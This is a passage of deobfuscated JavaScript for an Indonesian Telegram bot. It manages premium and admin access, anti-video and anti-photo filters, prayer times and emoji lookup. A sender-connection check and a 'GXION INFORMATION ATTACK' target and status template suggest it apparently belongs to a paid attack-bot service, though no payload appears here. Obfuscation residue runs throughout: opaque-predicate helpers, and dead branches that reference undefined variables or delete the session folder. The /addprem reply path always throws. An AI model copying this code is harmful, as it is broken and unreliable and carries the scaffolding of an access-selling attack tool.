  helper.formatHtml = "🪧 <b>Format:</b> <code>/addprem &lt;user_id&gt;</code> atau reply chat user";
  helper.htmlMode = "HTML";
  helper.duration30 = "30 HARI";
  helper.styleSuccess = "success";
  helper.emojiCrown = "4956214413578207998";
  helper.duration90 = "90 HARI";
  helper.stylePrimary = "primary";
  helper.duration120 = "120 HARI";
  helper.styleDanger = "danger";
  helper.cancelText = "❌ CANCEL ACTION";
  helper.emojiCancel = "4956612582816351459";
  const H = helper;
  let targetUserId;
  if (ctx.message.reply_to_message) {
    if (H.tag === "ouDqg") targetUserId = ctx.message.reply_to_message.from.id.toString();
    else throw new P(H.gusServer);
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }
  if (!targetUserId) {
    return ctx.reply(H.formatHtml, {
      parse_mode: H.htmlMode
    });
  }
  if (botRuntime.premiumUsers.includes(targetUserId)) {
    const opts = {};
    opts.parse_mode = "HTML";
    return ctx.reply("⚠️ <b>User</b> <code>" + targetUserId + "</code> sudah menjadi akses premium.", opts);
  }
  const executorId = ctx.from.id.toString(),
    photoOpts = {};
  photoOpts.caption = "<blockquote>\n<b>╭──〔 PREMIUM ACCESS 〕──╮</b>\n│  <tg-emoji emoji-id=\"4956461073550017373\">🥷🏻</tg-emoji><b>Target ID :</b> <code>" + targetUserId + "</code>\n│ <tg-emoji emoji-id=\"4958699241137505132\">🟢</tg-emoji><b>Status :</b> WAITING SELECT\n<b>╰────────────────────╯</b>\n<i>Apakah target id sudah benar ?</i>\nJika benar pilih durasi premium.\n</blockquote>";
  photoOpts.parse_mode = H.htmlMode;
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: H.duration30,
      callback_data: "prem_30_" + targetUserId + "_" + executorId,
      style: H.styleSuccess,
      icon_custom_emoji_id: H.emojiCrown
    }, {
      text: H.duration90,
      callback_data: "prem_90_" + targetUserId + "_" + executorId,
      style: H.stylePrimary,
      icon_custom_emoji_id: H.emojiCrown
    }, {
      text: H.duration120,
      callback_data: "prem_120_" + targetUserId + "_" + executorId,
      style: H.styleDanger,
      icon_custom_emoji_id: H.emojiCrown
    }],
    [{
      text: H.cancelText,
      callback_data: "prem_cancel_" + executorId,
      style: H.styleDanger,
      icon_custom_emoji_id: H.emojiCancel
    }]
  ];
  await ctx.replyWithPhoto("https://gangalink.vercel.app/i/r1468jak.jpg", photoOpts);
});
bot.action(/prem_.+/, async ctx => {
  const data = ctx.match[0];
  if (data.startsWith("prem_cancel_")) {
    const executorId = data.split("_")[2];
    if (ctx.from.id.toString() !== executorId) {
      const alert = {};
      alert.show_alert = true;
      return ctx.answerCbQuery("❌ Kamu bukan executor command ini!", alert);
    }
    await ctx.deleteMessage().catch(() => {});
    return;
  }
  const [prefix, duration, targetUserId, executorId] = data.split("_");
  if (ctx.from.id.toString() !== executorId) {
    const alert = {};
    alert.show_alert = true;
    return ctx.answerCbQuery("❌ Tombol ini bukan milik kamu!", alert);
  }
  !botRuntime.premiumUsers.includes(targetUserId) && (botRuntime.premiumUsers.push(targetUserId), saveJsonFile(PATHS.premiumFile, botRuntime.premiumUsers));
  const executorName = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name || "Unknown";
  const opts = {};
  opts.parse_mode = "HTML";
  await ctx.editMessageCaption("<blockquote>\n<b>╭──〔 PREMIUM STATUS 〕──╮</b>\n│ <tg-emoji emoji-id=\"4958610528588008305\">✅</tg-emoji><b>Status :</b> ACTIVE\n│ <tg-emoji emoji-id=\"4956461073550017373\">🥷🏻</tg-emoji><b>User :</b> <code>" + targetUserId + "</code>\n│  <tg-emoji emoji-id=\"4956214413578207998\">📝</tg-emoji><b>Duration :</b> " + duration + " Hari\n│ <tg-emoji emoji-id=\"5870619152829386951\">👑</tg-emoji><b>Executor Added :</b> " + executorName + "\n<b>╰────────────────────╯</b>\n</blockquote>", opts).catch(() => {});
});
bot.command("deladmin", ownerOnly, async ctx => {
  let userId;
  if (ctx.message.reply_to_message) userId = ctx.message.reply_to_message.from.id.toString();
  else {
    const args = ctx.message.text.split(" ");
    userId = args[1];
  }
  if (!userId) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n┇ *✨ CARA PAKAI DELADMIN* ✨\n┇ \n┇ 📌 *Contoh:*\n┇ `/deladmin 1113570863`\n┇ \n┇ 📌 *Atau reply pesan user:*\n┇ Ketik `/deladmin` sambil reply\n🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*", opts);
  }
  if (!botRuntime.adminList.includes(userId)) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n┇ ❌ *BUKAN ADMIN* ❌\n┇ \n" + ("┇ 👤 User ID: `" + userId + "`\n") + "┇ 📌 User ini tidak terdaftar sebagai admin.\n" + "⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*", opts);
  }
  removeAdmin(userId);
  const opts = {};
  opts.parse_mode = "Markdown";
  await ctx.reply("🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n┇\n" + ("┇ 👤 *User ID:* `" + userId + "`\n") + "┇\n" + "┇ 🚫 User sudah tidak memiliki\n" + "┇    akses admin lagi.\n" + "┇\n" + "┇ 📌 Akses admin telah dicabut.\n" + "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n" + "\n_✨ User sekarang menjadi user biasa._", opts);
});
bot.command("delprem", adminOnly, async ctx => {
  let userId;
  if (ctx.message.reply_to_message) userId = ctx.message.reply_to_message.from.id.toString();
  else {
    const args = ctx.message.text.split(" ");
    userId = args[1];
  }
  if (!userId) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("```js\n💎 ┏━━━━━━━━━━━━━━━━━━━━━━┓\n✨  CARA PAKAI COMMAND DELPREMIUM\n━━━━━━━━━━━━━━━━━━━━━━━\n📌 Contoh:\n/delprem 1113570863\n📌 Atau reply user:\n/delprem (reply pesan)\n💎 ┗━━━━━━━━━━━━━━━━━━━━━━┛\n```", opts);
  }
  if (!botRuntime.premiumUsers.includes(userId)) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("```js\n⚠️ ┏━━━━━━━━━━━━━━━━━━┓\n❌ USER BUKAN PREMIUM\n━━━━━━━━━━━━━━━━━━━\n👤 ID: `" + userId + "`\nUser ini tidak terdaftar premium sebagai\nakses premium !\n⚠️ ┗━━━━━━━━━━━━━━━━━━┛\n```", opts);
  }
  botRuntime.premiumUsers = botRuntime.premiumUsers.filter(id => id !== userId);
  saveJsonFile(PATHS.premiumFile, botRuntime.premiumUsers);
  const opts = {};
  opts.parse_mode = "Markdown";
  await ctx.reply("```js\n💎 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n✨  PREMIUM BERHASIL DIHAPUS\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 ID: `" + userId + "`\n🚫 Akses premium dicabut\n📌 Sekarang user tidak memiliki akses\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n```", opts);
});
bot.command("list", adminOnly, async ctx => {
  const helper = {};
  helper.markdown = "Markdown";
  helper.premiumLabel = "💎 PREMIUM ACCES";
  helper.premiumCb = "show_premium";
  helper.primaryStyle = "primary";
  helper.adminLabel = "👑 ADMIN ACCES";
  helper.adminCb = "show_admin";
  helper.successStyle = "success";
  helper.dangerStyle = "danger";
  const H = helper;
  const opts = {};
  opts.parse_mode = H.markdown;
  opts.reply_markup = {};
  opts.reply_markup.inline_keyboard = [
    [{
      text: H.premiumLabel,
      callback_data: H.premiumCb,
      style: H.primaryStyle
    }, {
      text: H.adminLabel,
      callback_data: H.adminCb,
      style: H.successStyle
    }],
    [{
      text: "🔥 OWNER ACCES",
      callback_data: "show_owner",
      style: H.dangerStyle
    }]
  ];
  await ctx.reply("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊\n━━━━━━━━━━━━━━━━━━\n⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...\n```", opts);
});
bot.action("show_premium", async ctx => {
  if (botRuntime.premiumUsers.length === 0) return ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⚠️\n━━━━━━━━━━━━━━━━━━\n⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙪𝙨𝙚𝙧 𝙥𝙧𝙚𝙢𝙞𝙪𝙢\n```", buildListBackKeyboard());
  let list = botRuntime.premiumUsers.map((id, index) => "⸙ " + (index + 1) + ". `" + id + "`").join("\n");
  await ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊\n━━━━━━━━━━━━━━━━━━\n" + list + "\n⸙ 𝙩𝙤𝙩𝙖𝙡 𝙥𝙧𝙚𝙢𝙞𝙪𝙢: " + botRuntime.premiumUsers.length + "\n```", buildListBackKeyboard());
});
bot.action("show_admin", async ctx => {
  if (botRuntime.adminList.length === 0) return ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️\n━━━━━━━━━━━━━━━━━━\n⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣\n```", buildListBackKeyboard());
  let list = botRuntime.adminList.map((id, index) => "⸙ " + (index + 1) + ". `" + id + "`").join("\n");
  await ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝘼𝘿𝙈𝙄𝙉 ☊\n━━━━━━━━━━━━━━━━━━\n" + list + "\n⸙ 𝙩𝙤𝙩𝙖𝙡: " + botRuntime.adminList.length + "\n```", buildListBackKeyboard());
});
bot.action("show_owner", async ctx => {
  if (botRuntime.ownerUsers.length === 0) {
    return ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 ⚠️\n━━━━━━━━━━━━━━━━━━\n⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙤𝙬𝙣𝙚𝙧\n```", buildListBackKeyboard());
  }
  let list = botRuntime.ownerUsers.map((id, index) => "⸙ " + (index + 1) + ". `" + id + "`").join("\n");
  await ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 👑\n━━━━━━━━━━━━━━━━━━\n" + list + "\n⸙ 𝙩𝙤𝙩𝙖𝙡: " + botRuntime.ownerUsers.length + "\n```", buildListBackKeyboard());
});
bot.action("list_back", async ctx => {
  const helper = {};
  helper.markdown = "Markdown";
  helper.premiumLabel = "💎 PREMIUM ACCES";
  helper.premiumCb = "show_premium";
  helper.primaryStyle = "primary";
  helper.adminLabel = "👑 ADMIN ACCES";
  helper.adminCb = "show_admin";
  helper.successStyle = "success";
  helper.ownerLabel = "🔥 OWNER ACCES";
  helper.ownerCb = "show_owner";
  helper.dangerStyle = "danger";
  const H = helper,
    opts = {};
  opts.parse_mode = H.markdown;
  opts.reply_markup = {};
  opts.reply_markup.inline_keyboard = [
    [{
      text: H.premiumLabel,
      callback_data: H.premiumCb,
      style: H.primaryStyle
    }, {
      text: H.adminLabel,
      callback_data: H.adminCb,
      style: H.successStyle
    }],
    [{
      text: H.ownerLabel,
      callback_data: H.ownerCb,
      style: H.dangerStyle
    }]
  ];
  await ctx.editMessageText("```js\n𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊\n━━━━━━━━━━━━━━━━━━\n⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...\n```", opts);
});

function buildListBackKeyboard() {
  const helper = {};
  helper.markdown = "Markdown";
  helper.backCb = "list_back";
  helper.dangerStyle = "danger";
  const H = helper,
    opts = {};
  opts.parse_mode = H.markdown;
  opts.reply_markup = {};
  opts.reply_markup.inline_keyboard = [
    [{
      text: "◀️ BACK",
      callback_data: H.backCb,
      style: H.dangerStyle
    }]
  ];
  return opts;
}
bot.command("antivideo", async ctx => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya bisa di group");
  const member = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
  const action = ctx.message.text.split(" ")[1];
  if (!action) return ctx.reply("📌 Format: /antivideo on /off");
  const chatId = ctx.chat.id.toString();
  if (action === "on") {
    !botRuntime.antiVideoGroups.includes(chatId) && (botRuntime.antiVideoGroups.push(chatId), saveJsonFile(PATHS.antiVideoFile, botRuntime.antiVideoGroups));
    return ctx.reply("✅ Anti video aktif di grup ini");
  }
  if (action === "off") {
    botRuntime.antiVideoGroups = botRuntime.antiVideoGroups.filter(id => id !== chatId);
    saveJsonFile(PATHS.antiVideoFile, botRuntime.antiVideoGroups);
    return ctx.reply("❌ Anti video dimatikan");
  }
  return ctx.reply("📌 Gunakan: /antivideo on /off");
});
bot.on("video", async ctx => {
  const helper = {};
  helper.notOwnerAlert = "❌ Tombol ini bukan milik kamu!";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "dYupq";
  helper.errorPrefix = "Error:";
  const H = helper;
  const chatId = ctx.chat.id.toString();
  if (!botRuntime.antiVideoGroups.includes(chatId)) return;
  try {
    await ctx.deleteMessage();
    const opts = {};
    opts.parse_mode = "Markdown";
    await ctx.reply("⚠️ @" + (ctx.from.username || ctx.from.first_name) + " 🚫 Dilarang mengirim video di grup ini!", opts);
  } catch (err) {
    if (H.equals(H.tag, H.tag)) console.log(H.errorPrefix, err.message);
    else {
      const alert = {};
      alert.show_alert = true;
      return ctx.answerCbQuery(H.notOwnerAlert, alert);
    }
  }
});
bot.command("antifoto", async ctx => {
  if (ctx.chat.type === "private") return ctx.reply("❌ Hanya bisa di group");
  const member = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
  const action = ctx.message.text.split(" ")[1];
  if (!action) return ctx.reply("📌 Format: /antifoto on /off");
  const chatId = ctx.chat.id.toString();
  if (action === "on") {
    !botRuntime.antiFotoGroups.includes(chatId) && (botRuntime.antiFotoGroups.push(chatId), saveJsonFile(PATHS.antiFotoFile, botRuntime.antiFotoGroups));
    return ctx.reply("✅ Anti foto aktif di grup ini");
  }
  if (action === "off") {
    botRuntime.antiFotoGroups = botRuntime.antiFotoGroups.filter(id => id !== chatId);
    saveJsonFile(PATHS.antiFotoFile, botRuntime.antiFotoGroups);
    return ctx.reply("❌ Anti foto dimatikan");
  }
  ctx.reply("📌 Gunakan: /antifoto on /off");
});
bot.on("photo", async ctx => {
  const helper = {};
  helper.htmlMode = "HTML";
  helper.markdown = "Markdown";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag = "ihhSp";
  helper.errorPrefix = "Error:";
  const H = helper;
  const chatId = ctx.chat.id.toString();
  if (!botRuntime.antiFotoGroups.includes(chatId)) return;
  try {
    await ctx.deleteMessage();
    const opts = {};
    opts.parse_mode = H.markdown;
    await ctx.reply("⚠️ @" + (ctx.from.username || ctx.from.first_name) + " 🚫 Dilarang mengirim foto di grup ini!", opts);
  } catch (err) {
    if (H.notEquals(H.tag, "ihhSp")) {
      const editOpts = {};
      editOpts.parse_mode = H.htmlMode;
      return ctx.telegram.editMessageCaption(err, targetId, null, "༺ <b>GXION INFORMATION ATTACK</b> ༻\n<blockquote><pre>\n➩ Target     : " + editOpts + "\n➩ Function   : " + functionName + "\n➩ Status     : ❌ Compile Failed\n➩ Reason     : " + compileError.message + "</pre></blockquote>", editOpts);
    } else console.log(H.errorPrefix, err.message);
  }
});
bot.command("groupon", ownerOnly, ctx => {
  saveGroupMode("on");
  ctx.reply("⚠️ Bot sekarang dalam mode group only, siapapun yang ingin mencoba mengakses bot di pm bot, Bot tidak akan memberikan Menu utama.");
});
bot.command("groupoff", ownerOnly, ctx => {
  const helper = {};
  helper.off = "off";
  const H = helper;
  saveGroupMode(H.off);
  ctx.reply("✅ GROUP ONLY DI MATIKAN USER BISA MENGAKSES BOT LEWAT PRIVATE ATAU GROUP.");
});
bot.command("mode", ownerOnly, ctx => {
  ctx.reply("⚙️ Mode saat ini: " + getBotMode().toUpperCase());
});
bot.command("self", ownerOnly, ctx => {
  saveBotMode("self");
  ctx.reply("🔐 Bot Di kunci Owner.");
});
bot.command("public", ownerOnly, ctx => {
  saveBotMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});
const channelPostCache = {};
bot.on("channel_post", ctx => {
  if (!ctx.channelPost) return;
  channelPostCache[ctx.chat.id] = ctx.channelPost.message_id;
});
const prayerTimesWib = {};
prayerTimesWib.subuh = "04:30";
prayerTimesWib.dzuhur = "12:00";
prayerTimesWib.ashar = "15:15";
prayerTimesWib.maghrib = "17:50";
prayerTimesWib.isya = "19:00";
const prayerTimesWita = {};
prayerTimesWita.subuh = "04:45";
prayerTimesWita.dzuhur = "12:15";
prayerTimesWita.ashar = "15:30";
prayerTimesWita.maghrib = "18:05";
prayerTimesWita.isya = "19:15";
const prayerTimesWit = {};
prayerTimesWit.subuh = "05:00";
prayerTimesWit.dzuhur = "12:30";
prayerTimesWit.ashar = "15:45";
prayerTimesWit.maghrib = "18:20";
prayerTimesWit.isya = "19:30";
const prayerTimesByZone = {};
prayerTimesByZone.wib = prayerTimesWib;
prayerTimesByZone.wita = prayerTimesWita;
prayerTimesByZone.wit = prayerTimesWit;
const prayerTimes = prayerTimesByZone,
  buildPrayerScheduleMessage = zone => {
    const times = prayerTimes[zone];
    return "<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT " + zone.toUpperCase() + " 〕━━━╮\n┃\n┃ 🌅 Subuh   : " + times.subuh + "\n┃ ☀️ Dzuhur  : " + times.dzuhur + "\n┃ 🌤 Ashar   : " + times.ashar + "\n┃ 🌇 Maghrib : " + times.maghrib + "\n┃ 🌙 Isya    : " + times.isya + "\n┃\n╰━━━━━━━━━━━━━━━━━━━━━━╯\n𖠋︎ Semoga ibadah anda lancar hari ini.</b></blockquote>";
  },
  backButton = {};
backButton.text = "⬅️ BACK";
backButton.callback_data = "back_jadwal";
backButton.style = "danger";
const backMarkup = {};
backMarkup.inline_keyboard = [
  [backButton]
];
const backOpts = {};
backOpts.parse_mode = "HTML";
backOpts.reply_markup = backMarkup;
const backOpts2 = backOpts,
  prayerMenuText = "<blockquote><b>╭━━━〔 🕌 JADWAL SHOLAT INDONESIA〕━━━╮\n┃\n┃ Silahkan pilih zona waktu\n┃ jadwal sholat yang ingin\n┃ anda lihat dibawah ini.\n┃\n╰━━━━━━━━━━━━━━━━━━━━━━╯</b></blockquote>",
  wibButton = {};
wibButton.text = "🌅 WIB";
wibButton.callback_data = "sholat_wib";
wibButton.style = "success";
const witaButton = {};
witaButton.text = "🌄 WITA";
witaButton.callback_data = "sholat_wita";
witaButton.style = "danger";
const witButton = {};
witButton.text = "🌙 WIT";
witButton.callback_data = "sholat_wit";
witButton.style = "primary";
const prayerZonesMarkup = {};
prayerZonesMarkup.inline_keyboard = [
  [wibButton, witaButton],
  [witButton]
];
const prayerZonesOpts = {};
prayerZonesOpts.parse_mode = "HTML";
prayerZonesOpts.reply_markup = prayerZonesMarkup;
const prayerZonesOpts2 = prayerZonesOpts;
bot.command("jadwalsholat", async ctx => {
  return ctx.reply(prayerMenuText, prayerZonesOpts2);
});
bot.action("back_jadwal", async ctx => {
  await ctx.answerCbQuery().catch(() => {});
  return ctx.editMessageText(prayerMenuText, prayerZonesOpts2);
});
bot.action("sholat_wib", async ctx => {
  return await ctx.answerCbQuery("Membuka jadwal WIB...").catch(() => {}), ctx.editMessageText(buildPrayerScheduleMessage("wib"), backOpts2);
});
bot.action("sholat_wita", async ctx => {
  const helper = {};
  helper.openLabel = "Membuka jadwal WITA...";
  helper.zone = "wita";
  const H = helper;
  return await ctx.answerCbQuery(H.openLabel).catch(() => {}), ctx.editMessageText(buildPrayerScheduleMessage(H.zone), backOpts2);
});
bot.action("sholat_wit", async ctx => {
  await ctx.answerCbQuery("Membuka jadwal WIT...").catch(() => {});
  return ctx.editMessageText(buildPrayerScheduleMessage("wit"), backOpts2);
});
bot.command("reactch", async ctx => {
  try {
    const args = ctx.message.text.split(" ").slice(1).join(""),
      [emoji, channel] = args.split(",");
    if (!emoji || !channel) return ctx.reply("❌ Contoh: /reactch 🌸,@channel");
    const chatInfo = await ctx.telegram.getChat(channel.trim()),
      chatId = chatInfo.id,
      messageId = channelPostCache[chatId];
    if (!messageId) return ctx.reply("❌ Kirim 1 post baru di channel dulu");
    await ctx.telegram.setMessageReaction(chatId, messageId, [{
      type: "emoji",
      emoji: emoji.trim()
    }]);
    ctx.reply("✅ React berhasil");
  } catch (err) {
    ctx.reply("❌ Gagal (cek bot join channel)");
  }
});
bot.command("cekemoji", async ctx => {
  const helper = {};
  helper.sessionDeleted = "Session di hapus";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.connected = "✅ CONNECTED";
  helper.notConnected = "❌ NOT CONNECT";
  helper.notConnectedSender = "ɴᴏᴛ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ";
  helper.htmlMode = "HTML";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "edaJF";
  helper.concat3 = function (a, b) {
    return a + b;
  };
  helper.customEmojiType = "custom_emoji";
  helper.concat4 = function (a, b) {
    return a + b;
  };
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag2 = "jnwhY";
  const H = helper;
  try {
    const repliedMessage = ctx.message?.["reply_to_message"],
      opts = {};
    opts.parse_mode = H.htmlMode;
    if (!repliedMessage) return ctx.reply("<blockquote><tg-emoji emoji-id=\"5260293700088511294\">⛔️</tg-emoji>Reply pesan yang berisi emoji premium.</blockquote>", opts);
    const foundEmojis = [];
    if (Array.isArray(repliedMessage.entities))
      for (const entity of repliedMessage.entities) {
        if (H.equals(H.tag, "edaJF")) H.equals(entity.type, "custom_emoji") && entity.custom_emoji_id && foundEmojis.push({
          id: entity.custom_emoji_id,
          emoji: repliedMessage.text?.["substring"](entity.offset, H.concat(entity.offset, entity.length)) || "❔"
        });
        else try {
          if (c.existsSync(e.sessionPath)) {
            const rmOpts = {};
            rmOpts.recursive = true;
            rmOpts.force = true;
            fs.rmSync(PATHS.sessionPath, rmOpts);
            console.log(chalk.hex("#ffb86c")("!") + chalk.white(H.sessionDeleted));
          }
        } catch (err) {
          console.log(H.concat2(chalk.hex("#ff5555")("✗"), chalk.white("Gagal menghapus session")));
        }
      }
    if (Array.isArray(repliedMessage.caption_entities))
      for (const entity of repliedMessage.caption_entities) {
        H.equals(entity.type, H.customEmojiType) && entity.custom_emoji_id && foundEmojis.push({
          id: entity.custom_emoji_id,
          emoji: repliedMessage.caption?.["substring"](entity.offset, H.concat4(entity.offset, entity.length)) || "❔"
        });
      }
    if (H.equals2(foundEmojis.length, 0)) return ctx.reply("<blockquote><tg-emoji emoji-id=\"5260293700088511294\">⛔️</tg-emoji>Tidak ada custom emoji terdeteksi.</blockquote>", {
      parse_mode: H.htmlMode
    });
    let message = "<blockquote expandable>\n<b><tg-emoji emoji-id=\"5206607081334906820\">✔️</tg-emoji>CUSTOM EMOJI DETECTED</b>\n━━━━━━━━━━━━━━━━━━";
    foundEmojis.forEach((item, index) => {
      message += "\n<b>• Emoji " + H.concat(index, 1) + "</b>\n" + item.emoji + "\n<code>" + item.id + "</code>\n<b><tg-emoji emoji-id=\"5197269100878907942\">✍️</tg-emoji>Format Memakai Di HTML:</b>\n<code>&lt;tg-emoji emoji-id=\"" + item.id + "\"&gt;" + item.emoji + "&lt;/tg-emoji&gt;</code>\n━━━━━━━━━━━━━━━━━━";
    });
    message += "\n<b><tg-emoji emoji-id=\"4958699241137505132\">🎁</tg-emoji>Total Custom Emoji:</b> " + foundEmojis.length + "\n</blockquote>";
    const opts2 = {};
    opts2.parse_mode = "HTML";
    opts2.disable_web_page_preview = true;
    return ctx.reply(message, opts2);
  } catch (err) {
    if (H.notEquals(H.tag2, H.tag2)) try {
      if (botRuntime.sock && botRuntime.sock.user && botRuntime.sock.user.id) return H.connected;
      return H.notConnected;
    } catch {
      return H.notConnectedSender;
    } else {
      const opts = {};
      opts.parse_mode = H.htmlMode;
      return ctx.reply("<blockquote>❌ Terjadi error saat membaca emoji.</blockquote>", opts);
    }
  }
});
bot.command("runtime", ctx => {
  const helper = {};
  helper.modulo = function (a, b) {
    return a % b;
  };
  const H = helper,
    uptime = process.uptime();
  const hours = Math.floor(uptime / 3600),
    minutes = Math.floor(H.modulo(uptime, 3600) / 60);
  const seconds = Math.floor(H.modulo(uptime, 60));
  ctx.reply("┏━━━〔 RUNTIME 〕━━━┓\n┃ 🤖 Bot Active\n┃ ⏳ " + hours + " Jam " + minutes + " Menit " + seconds + " Detik\n┗━━━━━━━━━━━━━━━━━━┛");
});

function parseCooldownString(input) {
  const match = input.match(/^(\d+)([dhms])$/i);
  if (!match) return null;
  const value = parseInt(match[1]),
    unit = match[2].toLowerCase(),
    unitMs = {};
  unitMs.s = 1000;
  unitMs.m = 60000;
  unitMs.h = 3600000;
  unitMs.d = 86400000;
  const multipliers = unitMs;
  return value * multipliers[unit];
}
bot.command("setcd", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");
  if (args[1] === "0") return botRuntime.COOLDOWN_TIME = 0, botRuntime.COOLDOWN_TEXT = "0s", ctx.reply("✅ Cooldown dimatikan");
  const cooldownMs = parseCooldownString(args[1]);
  if (!cooldownMs) return ctx.reply("⚠️ Format salah!");
  botRuntime.COOLDOWN_TIME = cooldownMs;
  botRuntime.COOLDOWN_TEXT = args[1];
  ctx.reply("✅ Cooldown diubah ke 1d");
});
bot.command("anticulik", ownerOnly, ctx => {
  const action = ctx.message.text.split(" ")[1];
  if (!action) return ctx.reply("Gunakan: /anticulik on | /anticulik off | /anticulik autoreject");
  if (action === "on") {
    botRuntime.antiCulik = true;
    botRuntime.autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else {
    if (action === "off") {
      botRuntime.antiCulik = false;
      ctx.reply("❌ AntiCulik OFF");
    } else if (action === "autoreject") {
      botRuntime.antiCulik = true;
      botRuntime.autoReject = true;
      ctx.reply("🚫 Auto Reject ON");
    }
  }
});
bot.command("addsafe", ctx => {
  if (!isOwner(ctx.from.id)) return;
  if (ctx.chat.type === "private") return ctx.reply("❌ Gunakan di group");
  const chatId = ctx.chat.id.toString();
  if (botRuntime.whitelistGroups.includes(chatId)) return ctx.reply("⚠️ Sudah SAFE");
  botRuntime.whitelistGroups.push(chatId);
  saveJsonFile(PATHS.safeFile, botRuntime.whitelistGroups);
  ctx.reply("✅ Group SAFE");
});
bot.command("delsafe", ctx => {
  if (!isOwner(ctx.from.id)) return;
  const chatId = ctx.chat.id.toString();
  botRuntime.whitelistGroups = botRuntime.whitelistGroups.filter(id => id !== chatId);
  saveJsonFile(PATHS.safeFile, botRuntime.whitelistGroups);
  ctx.reply("❌ SAFE dihapus");
});
bot.on("my_chat_member", async ctx => {
  try {
    const newStatus = ctx.update.my_chat_member.new_chat_member.status;
    if (newStatus !== "member" && newStatus !== "administrator") return;
    const chat = ctx.chat,
      chatId = chat.id,
      chatTitle = chat.title;
    if (isWhitelistedGroup(chatId)) return;
    const actor = ctx.update.my_chat_member.from,
      actorId = actor.id,
      actorUsername = actor.username ? "@" + actor.username : "Tidak ada",
      actorFullName = ((actor.first_name || "") + " " + (actor.last_name || "")).trim();
    botRuntime.pendingGroups = botRuntime.pendingGroups || new Map();
    const pendingInfo = {};
    pendingInfo.userId = actorId;
    pendingInfo.username = actorUsername;
    pendingInfo.fullName = actorFullName;
    pendingInfo.groupName = chatTitle;
    botRuntime.pendingGroups.set(chatId, pendingInfo);
    for (const ownerUserId of botRuntime.ownerUsers) {
      try {
        await bot.telegram.sendMessage(ownerUserId, "🚨 BOT DICULIK\n\n📛 Grup : " + chatTitle + "\n🆔 ID   : " + chatId + "\n\n👤 Pelaku:\n• Nama     : " + actorFullName + "\n• Username : " + actorUsername + "\n• ID       : " + actorId, {
          reply_markup: {
            inline_keyboard: [
              [{
                text: "✅ Izinkan",
                callback_data: "allow_" + chatId
              }, {
                text: "❌ Tolak",
                callback_data: "deny_" + chatId
              }]
            ]
          }
        });
      } catch {}
    }
  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});
bot.action(/(allow|deny)_(.+)/, async ctx => {
  const alert = {};
  alert.show_alert = true;
  if (!isOwner(ctx.from.id)) return ctx.answerCbQuery("❌ Bukan owner!", alert);
  const action = ctx.match[1],
